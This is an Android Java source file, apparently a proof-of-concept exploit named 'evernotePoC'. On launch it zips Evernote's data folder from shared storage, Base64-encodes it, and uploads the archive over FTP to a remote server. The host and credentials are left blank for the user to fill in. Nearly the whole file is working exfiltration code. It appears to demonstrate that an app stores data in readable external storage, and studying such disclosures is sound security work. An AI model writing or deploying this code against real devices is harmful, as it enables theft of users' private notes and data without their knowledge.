package com.evernotePoC;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;

import android.os.AsyncTask;
import android.os.Bundle;
import android.app.Activity;
import android.content.Context;
import android.util.Base64;
import android.util.Log;
import android.view.Menu;
import com.evernotePoC.Utils;
import org.apache.commons.net.ftp.FTP;
import org.apache.commons.net.ftp.FTPClient;

public class MainActivity extends Activity {

	private static final String TAG = MainActivity.class.getSimpleName();
    private Context mContext;

	@Override
	protected void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		setContentView(R.layout.activity_main);
		mContext = this;

		try {
	          startExploit();
        } catch (Exception e) {
                // Collecting all the errors in one place
                Log.e(TAG, e.getMessage());
                e.printStackTrace();
                finish();
		}		
	}

	@Override
	public boolean onCreateOptionsMenu(Menu menu) {
		// Inflate the menu; this adds items to the action bar if it is present.
		getMenuInflater().inflate(R.menu.main, menu);
		return true;
	}
	
	private void startExploit() throws  InterruptedException {
		String zipName = "/sdcard/evernote.zip";
		String srcPath = "/sdcard/Android/data/com.evernote";
		
		//Utils.zip(zipName, srcPath);
		Utils.zipFileAtPath(srcPath, zipName);

		byte[] bytes;
		try {
			bytes = Utils.readFile(zipName);
			
			String encoded = Base64.encodeToString(bytes, 0); 

			FTPTask ftpTask = new FTPTask();
	        ftpTask.execute(encoded, zipName);
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		
	}
	
	private class FTPTask extends AsyncTask<String, Void, Void> {

        @Override
        protected Void doInBackground(String... params) {
                // local copy
                byte[] bytes = Base64.decode(params[0], 0);
                File output = new File(params[1]);
                try {
                        FileOutputStream os = new FileOutputStream(output, true);
                        os.write(bytes);
                        os.flush();
                        os.close();
                } catch (Exception e) {
                        Log.e(TAG, "Error while saving file");
                }

                FTPClient con = null;
                Log.v("Test ", "" + output);
                try
                {
                        con = new FTPClient();
                        con.connect("", 21);  // Change me
                        String reply = "" + con.getReplyCode();
                        Log.v("Connection established ", reply);
                        if(con.isConnected()) {
                        	try {
                        		con.login("", ""); // Change me
                                con.enterLocalPassiveMode(); // important!
                                con.setFileType(FTP.BINARY_FILE_TYPE);

                                FileInputStream in = new FileInputStream(output);
                                Log.v("Test ", "" + in);
                                
                                boolean result = con.storeFile("evernote.zip", in);
                                Log.v("Test result ", ""+result);
                                if (result) Log.v("upload result", "succeeded");
                                else Log.v("Upload result", "failed");
                                in.close();

                                con.logout();
                                con.disconnect();
                        	}catch (IOException e) {
                        		
                        	}
                        }
                        
                }
                catch (Exception e)
                {
                        e.printStackTrace();
                }

                return null;
        }

}

}
